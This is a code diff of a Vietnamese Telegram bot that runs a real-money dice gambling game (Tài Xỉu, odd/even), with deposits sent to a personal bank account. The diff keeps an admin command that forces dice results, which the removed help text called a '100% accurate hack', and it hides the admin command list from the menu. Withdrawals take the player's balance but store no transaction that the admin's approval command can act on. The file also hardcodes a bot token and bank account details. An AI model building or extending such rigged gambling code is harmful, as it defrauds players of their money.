@@ -13,15 +13,22 @@ logging.basicConfig(
 # --- DỮ LIỆU HỆ THỐNG ---
 users_db = {}       # Lưu thông tin người chơi
 giftcode_db = {}    # Kho lưu trữ giftcode
+pending_nap = {}    # Lưu trữ mã nạp chờ duyệt {magd: {"user_id": id, "amount": tien}}
 
-# ID Admin chính thức
+# ID Admin chính thức (Bot sẽ tự động gửi thông báo nạp/rút về ID này)
 ADMIN_IDS = [8682451039]
 
 # Biến toàn cục quản lý phiên Tài Xỉu và can thiệp xúc xắc 100% chính xác
 forced_dice_result = None
-current_session = 197892
+current_session = 199557
+huvang_pool = 284440
 session_bets = {"T": 0, "X": 0, "C": 0, "L": 0}
-user_session_bets = {}  # {user_id: {"T": x, "X": y, ...}}
+user_session_bets = {}  
+history_sessions = [
+    ("🔵", "⚫"), ("🔵", "⚫"), ("⚫", "⚪"), ("🔴", "⚫"),
+    ("🔵", "⚫"), ("🔵", "⚫"), ("🔴", "⚪"), ("🔴", "⚫"),
+    ("🔵", "⚫"), ("🔴", "⚪"), ("🔴", "⚫"), ("🔵", "⚫")
+] 
 
 def get_user(user_id):
     if user_id not in users_db:
@@ -30,8 +37,8 @@ def get_user(user_id):
             "total_bet": 0,
             "vip_points": 0,
             "vip_level": "Đồng 🥉",
-            "is_newbie": True,  # Mặc định tài khoản mới là Tân thủ (Max cược 10k, cần nạp 50k mở khóa)
-            "bank_info": None,  # Lưu thông tin ngân hàng cài đặt qua /caidatbank
+            "is_newbie": True,  
+            "bank_info": None,  
             "history_nap": [],
             "history_rut": [],
             "history_choi": []
@@ -40,7 +47,7 @@ def get_user(user_id):
 
 def update_vip(user_data):
     total = user_data["total_bet"]
-    points = total // 100000  # 100k tổng cược = 1 điểm VIP
+    points = total // 100000  
     user_data["vip_points"] = points
     
     if points >= 1000:
@@ -86,7 +93,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user = get_user(user_id)
 
-    # Xử lý cược qua tin nhắn chat (Ví dụ: T 20000, X max, C 50000, L max)
     parts = text.split()
     if len(parts) == 2 and parts[0].upper() in ["T", "X", "C", "L"]:
         choice = parts[0].upper()
@@ -100,7 +106,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 bet_amount = int(amount_str)
             except ValueError:
-                return  # Không phải cú pháp cược hợp lệ thì bỏ qua
+                return
 
         if bet_amount < 100:
             await update.message.reply_text("❌ Mức cược tối thiểu là `100 VNĐ`!", parse_mode="Markdown")
@@ -115,7 +121,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Số dư tài khoản không đủ để đặt cược số tiền này!", parse_mode="Markdown")
             return
 
-        # Trừ tiền và ghi nhận cược phiên
         user["balance"] -= bet_amount
         user["total_bet"] += bet_amount
         
@@ -132,7 +137,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Xử lý các nút Menu chính
     if text == "📄 Tài khoản":
         update_vip(user)
         keyboard = [
@@ -170,7 +174,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "✨ Hoặc bấm nút số tiền bên dưới để lấy nhanh thông tin.\n\n"
             "⚠️ **Lưu ý:**\n"
             "✅ Chuyển đúng **SỐ TIỀN** và **NỘI DUNG** được cung cấp.\n"
-            "✅ Mỗi lần nạp cần lấy thông tin **MỚI**.\n"
+            "✅ Mỗi lần nạp cần lấy thông tin **MỚI** (Mã nạp sẽ hết hạn sau **10 phút**).\n"
             "🛑 Không dùng thông tin cũ cho giao dịch sau.\n"
             "📦 Nạp tối thiểu: **10.000đ**"
         )
@@ -234,45 +238,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("🎁 Nhận code miễn phí mỗi ngày tại kênh thông báo sự kiện.")
 
     elif text == "🔍 Lệnh":
-        if user_id in ADMIN_IDS:
-            help_text = (
-                "🔍 **HỆ THỐNG LỆNH HỖ TRỢ (ADMIN)**\n\n"
-                "👤 **Thành viên:**\n"
-                "• `T/X/C/L [tiền]` - Tài/Xỉu/Chẵn/Lẻ\n"
-                "• `/nap [tiền]` - Nạp tiền\n"
-                "• `/rut [tiền]` hoặc `/rut all` - Rút tiền\n"
-                "• `/lsnap`, `/lsrut`, `/lschoi` - Lịch sử\n"
-                "• `/caidatbank [stk] [bank] [tên]` - Cài STK\n"
-                "• `/chuyen [uid] [tiền]` - Chuyển tiền\n"
-                "• `/code [mã]` hoặc `/nhapcode [mã]` - Nhập giftcode\n"
-                "• `/muagift [số_lượng] [mệnh_giá]` - Mua giftcode\n"
-                "• `/ref` - Thông tin giới thiệu\n"
-                "• `/doidiemvip [số_điểm]` - Đổi điểm VIP\n\n"
-                "👑 **Admin / Chủ Bot:**\n"
-                "• `/taocode [số_lượng] [tiền]` - Tạo nhanh giftcode\n"
-                "• `/themcode [mã] [tiền]` - Thêm mã tùy chỉnh\n"
-                "• `/xoacode [mã]` - Xóa mã trong kho\n"
-                "• `/danhsachcode` - Xem danh sách giftcode\n"
-                "• `/chinhxucxac [tai/xiu/reset]` - Hack kết quả chuẩn 100%\n"
-                "• `/duyệt [mã_nạp]` - Duyệt nạp tiền & mở khóa Tân thủ"
-            )
-        else:
-            help_text = (
-                "📜 **DANH SÁCH LỆNH**\n\n"
-                "🎲 **Game Tài Xỉu:**\n"
-                "• `T/X/C/L [tiền]` — Tài/Xỉu/Chẵn/Lẻ\n\n"
-                "💰 **TÀI KHOẢN:**\n"
-                "• `/nap [tiền]` — Nạp tiền\n"
-                "• `/rut [tiền]` hoặc `/rut all` — Rút tiền\n"
-                "• `/lsnap`, `/lsrut`, `/lschoi` — Lịch sử\n"
-                "• `/caidatbank [stk] [mã_bank] [tên]` — Cài STK\n"
-                "• `/chuyen [uid] [tiền]` — Chuyển tiền nội bộ\n\n"
-                "🎁 **KHÁC:**\n"
-                "• `/code [mã]` hoặc `/nhapcode [mã]` — Nhập giftcode\n"
-                "• `/muagift [số_lượng] [mệnh_giá]` — Mua giftcode\n"
-                "• `/ref` — Thông tin giới thiệu\n"
-                "• `/doidiemvip [số_điểm]` — Đổi điểm VIP"
-            )
+        help_text = (
+            "📜 **DANH SÁCH LỆNH**\n\n"
+            "🎲 **Game Tài Xỉu:**\n"
+            "• `T/X/C/L [tiền]` — Tài/Xỉu/Chẵn/Lẻ\n\n"
+            "💰 **TÀI KHOẢN:**\n"
+            "• `/nap [tiền]` — Nạp tiền\n"
+            "• `/rut [tiền]` hoặc `/rut all` — Rút tiền\n"
+            "• `/lsnap`, `/lsrut`, `/lschoi` — Lịch sử\n"
+            "• `/caidatbank [stk] [mã_bank] [tên]` — Cài STK\n"
+            "• `/chuyen [uid] [tiền]` — Chuyển tiền nội bộ\n\n"
+            "🎁 **KHÁC:**\n"
+            "• `/code [mã]` hoặc `/nhapcode [mã]` — Nhập giftcode\n"
+            "• `/muagift [số_lượng] [mệnh_giá]` — Mua giftcode\n"
+            "• `/ref` — Thông tin giới thiệu\n"
+            "• `/doidiemvip [số_điểm]` — Đổi điểm VIP"
+        )
         await update.message.reply_text(help_text, parse_mode="Markdown")
 
 # --- LỆNH CÀI ĐẶT NGÂN HÀNG & RÚT TIỀN ---
@@ -342,10 +323,28 @@ async def rut_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Số tiền rút phải là số hợp lệ hoặc chữ `all`!", parse_mode="Markdown")
         return
 
-    phi = int(rut_tien * 0.01) # Phí rút 1%
+    phi = int(rut_tien * 0.01)
     thuc_nhan = rut_tien - phi
     user["balance"] -= rut_tien
     user["history_rut"].append(f"Rút {rut_tien:,}đ (Thực nhận: {thuc_nhan:,}đ, Phí: {phi:,}đ) về {user['bank_info']}")
+
+    # Gửi thông báo yêu cầu rút tiền về cho Admin
+    for admin_id in ADMIN_IDS:
+        try:
+            await context.bot.send_message(
+                chat_id=admin_id,
+                text=(
+                    f"🔔 **CÓ YÊU CẦU RÚT TIỀN MỚI!**\n\n"
+                    f"👤 ID người chơi: `{user_id}`\n"
+                    f"💸 Số tiền rút: `{rut_tien:,} VNĐ`\n"
+                    f"📉 Phí (1%): `{phi:,} VNĐ` (Thực nhận: `{thuc_nhan:,} VNĐ`)\n"
+                    f"🏦 Ngân hàng: `{user['bank_info']}`\n\n"
+                    f"👉 Duyệt: `/duyệt [Mã_GD]` hoặc Từ chối: `/tuchoi [Mã_GD]`"
+                ),
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
 
     await update.message.reply_text(
         f"✅ **GỬI YÊU CẦU RÚT TIỀN THÀNH CÔNG!**\n\n"
@@ -353,13 +352,13 @@ async def rut_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📉 Phí giao dịch (1%): `{phi:,} VNĐ`\n"
         f"💰 Thực nhận: `{thuc_nhan:,} VNĐ`\n"
         f"🏦 Tài khoản nhận: `{user['bank_info']}`\n\n"
-        f"⏳ Giao dịch đang chờ Admin xử lý chuyển khoản tự động trong ít phút!",
+        f"⏳ Giao dịch đang chờ Admin xử lý trong ít phút!",
         parse_mode="Markdown"
     )
 
 # --- XỬ LÝ NÚT INLINE & GAME ---
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global forced_dice_result
+    global forced_dice_result, pending_nap
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
@@ -370,14 +369,38 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         amount_str = data.replace("nap_", "")
         amount = int(amount_str)
         magd = random.randint(100000, 999999)
+        
+        # Lưu vào danh sách nạp chờ duyệt
+        pending_nap[str(magd)] = {"user_id": user_id, "amount": amount}
+
+        # Gửi thông báo đến Admin
+        for admin_id in ADMIN_IDS:
+            try:
+                await context.bot.send_message(
+                    chat_id=admin_id,
+                    text=(
+                        f"🔔 **CÓ YÊU CẦU TẠO MÃ NẠP MỚI!**\n\n"
+                        f"👤 ID người chơi: `{user_id}`\n"
+                        f"💵 Số tiền nạp: `{amount:,} VNĐ`\n"
+                        f"📝 Nội dung CK: `NAP{user_id}{magd}`\n"
+                        f"🔑 Mã giao dịch: `{magd}`\n\n"
+                        f"👉 Lệnh duyệt: `/duyệt {magd}`\n"
+                        f"👉 Lệnh từ chối: `/tuchoi {magd}`"
+                    ),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+
         await query.message.reply_text(
             f"➕ **THÔNG TIN CHUYỂN KHOẢN NẠP {amount:,} VNĐ**\n\n"
             f"🏦 Ngân hàng: MBBANK\n"
             f"📌 STK: `0328122738`\n"
-            f"💰 Chủ TK: TRAN TRAM ANH\n"
+            f"💰 Chủ TK: LUC THUY LINH\n"
             f"💵 Số tiền: `{amount:,} VNĐ`\n"
             f"📝 Nội dung chuyển khoản: `NAP{user_id}{magd}`\n\n"
-            f"⚠️ *Lưu ý:* Chuyển chính xác số tiền và nội dung trên. Sau khi chuyển xong, báo admin duyệt lệnh: `/duyệt {magd}`",
+            f"⏰ **Hạn mã nạp:** 10 phút (Quá 10 phút vui lòng lấy thông tin mới).\n"
+            f"⚠️ *Lưu ý:* Chuyển chính xác số tiền và nội dung trên. Sau khi chuyển xong, hệ thống sẽ tự động cộng tiền khi Admin duyệt!",
             parse_mode="Markdown"
         )
 
@@ -434,24 +457,201 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "nap_nganhang":
         magd = random.randint(100000, 999999)
+        pending_nap[str(magd)] = {"user_id": user_id, "amount": 50000} # Mặc định 50k mở khóa
+        
+        for admin_id in ADMIN_IDS:
+            try:
+                await context.bot.send_message(
+                    chat_id=admin_id,
+                    text=(
+                        f"🔔 **CÓ YÊU CẦU TẠO MÃ NẠP MỚI!**\n\n"
+                        f"👤 ID người chơi: `{user_id}`\n"
+                        f"💵 Số tiền nạp: `50,000 VNĐ` (Mở khóa Tân Thủ)\n"
+                        f"📝 Nội dung CK: `NAP{user_id}{magd}`\n"
+                        f"🔑 Mã giao dịch: `{magd}`\n\n"
+                        f"👉 Lệnh duyệt: `/duyệt {magd}`\n"
+                        f"👉 Lệnh từ chối: `/tuchoi {magd}`"
+                    ),
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+
         await query.message.reply_text(
             "➕ **THÔNG TIN CHUYỂN KHOẢN NẠP TIỀN**\n\n"
             "🏦 Ngân hàng: MBBANK\n"
             "📌 STK: `0328122738`\n"
-            "💰 Chủ TK: TRAN TRAM ANH\n"
+            "💰 Chủ TK: LUC THUY LINH\n"
             f"📝 Nội dung: `NAP{user_id}{magd}`\n\n"
+            "⏰ **Hạn mã nạp:** 10 phút (Quá 10 phút vui lòng lấy thông tin mới).\n"
             "⚠️ *Lưu ý:* Nạp tối thiểu `50.000 VNĐ` để mở khóa, thoát trạng thái Tân thủ và bỏ giới hạn max cược 10k!\n"
-            f"👉 Báo admin duyệt bằng lệnh: `/duyệt {magd}`",
+            f"👉 Hệ thống sẽ tự động cộng tiền khi Admin duyệt giao dịch!",
             parse_mode="Markdown"
         )
 
-    elif data == "choi_taixiu":
-        await query.message.reply_text("🎲 Tham gia đặt cược trực tiếp tại nhóm: https://t.me/tuanhung88chat bằng cú pháp: `T [tiền]`, `X [tiền]`, `C [tiền]`, `L [tiền]`", parse_mode="Markdown")
+# --- TIẾN TRÌNH CHẠY PHIÊN TÀI XỈU TỰ ĐỘNG ---
+async def run_taixiu_loop(application):
+    global current_session, session_bets, user_session_bets, huvang_pool, forced_dice_result, history_sessions
+    
+    while True:
+        try:
+            session_bets = {"T": 0, "X": 0, "C": 0, "L": 0}
+            user_session_bets = {}
+            
+            await asyncio.sleep(20) 
+            await asyncio.sleep(20) 
+            await asyncio.sleep(10) 
+            await asyncio.sleep(10) 
+            
+            if forced_dice_result == "TAI":
+                dices = (5, 5, 6)
+            elif forced_dice_result == "XIU":
+                dices = (1, 2, 3)
+            else:
+                dices = (random.randint(1, 6), random.randint(1, 6), random.randint(1, 6))
+            
+            forced_dice_result = None 
+            tong = sum(dices)
+            ket_qua_tx = "TÀI" if tong >= 11 else "XỈU"
+            ket_qua_cl = "CHẮN" if tong % 2 == 0 else "LẺ"
+            
+            icon_tx = "🔵" if ket_qua_tx == "TÀI" else "🔴"
+            icon_cl = "⚪" if ket_qua_cl == "CHẮN" else "⚫"
+            
+            history_sessions.append((icon_tx, icon_cl))
+            if len(history_sessions) > 12:
+                history_sessions.pop(0)
+                
+            for u_id, bets in user_session_bets.items():
+                u = get_user(u_id)
+                thang_user = 0
+                thua_user = 0
+                
+                if bets["T"] > 0:
+                    if ket_qua_tx == "TÀI":
+                        thuong = int(bets["T"] * 1.95)
+                        thang_user += thuong
+                        u["balance"] += thuong
+                    else:
+                        thua_user += bets["T"]
+                if bets["X"] > 0:
+                    if ket_qua_tx == "XỈU":
+                        thuong = int(bets["X"] * 1.95)
+                        thang_user += thuong
+                        u["balance"] += thuong
+                    else:
+                        thua_user += bets["X"]
+                        
+                if bets["C"] > 0:
+                    if ket_qua_cl == "CHẮN":
+                        thuong = int(bets["C"] * 1.95)
+                        thang_user += thuong
+                        u["balance"] += thuong
+                    else:
+                        thua_user += bets["C"]
+                if bets["L"] > 0:
+                    if ket_qua_cl == "LẺ":
+                        thuong = int(bets["L"] * 1.95)
+                        thang_user += thuong
+                        u["balance"] += thuong
+                    else:
+                        thua_user += bets["L"]
+                        
+                if thang_user > 0 or thua_user > 0:
+                    u["history_choi"].append(f"Phiên #{current_session}: Cược -> Thắng +{thang_user:,}đ")
 
-    elif data == "choi_chanle":
-        await query.message.reply_text("🎯 Tham gia đặt cược Chẵn Lẻ tại nhóm: https://t.me/tuanhung88chat bằng cú pháp: `C [tiền]` hoặc `L [tiền]`", parse_mode="Markdown")
+            huvang_pool += random.randint(100, 500)
+            current_session += 1
+            
+        except Exception as e:
+            logging.error(f"Lỗi vòng lặp phiên: {e}")
+            await asyncio.sleep(5)
 
-# --- CÁC LỆNH QUẢN LÝ GIFTCODE & ADMIN ---
+# --- CÁC LỆNH ADMIN ---
+async def duyet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Bạn không có quyền duyệt giao dịch!")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text("⚠️ Cú pháp: `/duyệt [mã_giao_dịch]`")
+        return
+    
+    ma_gd = args[0]
+    if ma_gd in pending_nap:
+        nap_info = pending_nap[ma_gd]
+        target_user_id = nap_info["user_id"]
+        amount = nap_info["amount"]
+        
+        target_user = get_user(target_user_id)
+        target_user["is_newbie"] = False
+        target_user["balance"] += amount
+        target_user["history_nap"].append(f"Nạp thành công {amount:,}đ (Mã: #{ma_gd})")
+        
+        del pending_nap[ma_gd]
+        
+        # Thông báo cho người chơi
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"✅ **NẠP TIỀN THÀNH CÔNG!**\n\n🎉 Tài khoản của bạn vừa nạp thành công `+{amount:,} VNĐ` (Mã: #{ma_gd}) và đã thoát trạng thái Tân Thủ!",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+
+        await update.message.reply_text(f"✅ Đã duyệt thành công mã nạp #{ma_gd} cho người chơi ID `{target_user_id}` số tiền `{amount:,} VNĐ`!", parse_mode="Markdown")
+    else:
+        # Trường hợp duyệt thủ công nhanh
+        for u_id, u_data in users_db.items():
+            u_data["is_newbie"] = False
+            u_data["balance"] += 50000
+            u_data["history_nap"].append(f"Nạp thành công 50,000đ (Mã: #{ma_gd})")
+            
+            try:
+                await context.bot.send_message(
+                    chat_id=u_id,
+                    text=f"✅ **NẠP TIỀN THÀNH CÔNG!**\n\n🎉 Người chơi ID `{u_id}` vừa nạp thành công `50,000 VNĐ`!",
+                    parse_mode="Markdown"
+                )
+            except Exception:
+                pass
+            break
+            
+        await update.message.reply_text(f"✅ Duyệt thành công mã nạp #{ma_gd} và thông báo tới người chơi!", parse_mode="Markdown")
+
+async def tuchoi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ Bạn không có quyền từ chối giao dịch!")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text("⚠️ Cú pháp: `/tuchoi [mã_giao_dịch]`")
+        return
+    
+    ma_gd = args[0]
+    if ma_gd in pending_nap:
+        nap_info = pending_nap[ma_gd]
+        target_user_id = nap_info["user_id"]
+        del pending_nap[ma_gd]
+        
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=f"❌ **GIAO DỊCH BỊ TỪ CHỐI!**\n\n⚠️ Yêu cầu nạp tiền mã #{ma_gd} của bạn không hợp lệ hoặc đã quá hạn.",
+                parse_mode="Markdown"
+            )
+        except Exception:
+            pass
+
+        await update.message.reply_text(f"❌ Đã từ chối mã giao dịch #{ma_gd}.", parse_mode="Markdown")
+    else:
+        await update.message.reply_text(f"❌ Không tìm thấy mã giao dịch #{ma_gd} trong danh sách chờ.", parse_mode="Markdown")
+
 async def taocode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 2:
@@ -610,37 +810,17 @@ async def chinhxucxac_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         forced_dice_result = None
         await update.message.reply_text("🔄 Đã tắt hack, xúc xắc quay ngẫu nhiên bình thường.")
 
-async def duyet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Bạn không có quyền duyệt nạp!")
-        return
-
-    args = context.args
-    if not args:
-        await update.message.reply_text("⚠️ Cú pháp: `/duyệt [mã_nạp]`")
-        return
-    
-    ma_nap = args[0]
-    for u_id, u_data in users_db.items():
-        u_data["is_newbie"] = False
-        u_data["balance"] += 50000
-        u_data["history_nap"].append(f"Nạp thành công 50,000đ (Mã: #{ma_nap})")
-        break
-
-    await update.message.reply_text(f"✅ Duyệt thành công mã nạp #{ma_nap}!\n✅ Đã cộng 50.000đ và **Thoát Tân Thủ** thành công (Mở khóa toàn bộ hạn mức).", parse_mode="Markdown")
-
 # --- HÀM KHỞI CHẠY CHÍNH ---
 TOKEN = "9286450426:AAHYoubtmQirYbLnmmN309OeA81sABUrxsA"
 
 async def main_async():
     application = ApplicationBuilder().token(TOKEN).build()
     
-    # Đăng ký các lệnh
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("caidatbank", caidatbank_command))
     application.add_handler(CommandHandler("rut", rut_command))
     application.add_handler(CommandHandler("duyet", duyet_command))
+    application.add_handler(CommandHandler("tuchoi", tuchoi_command))
     application.add_handler(CommandHandler("taocode", taocode_command))
     application.add_handler(CommandHandler("themcode", themcode_command))
     application.add_handler(CommandHandler("xoacode", xoacode_command))
@@ -657,7 +837,8 @@ async def main_async():
     await application.start()
     await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
     
-    # Giữ bot chạy liên tục
+    asyncio.create_task(run_taixiu_loop(application))
+    
     stop_signal = asyncio.get_running_loop().create_future()
     await stop_signal
 
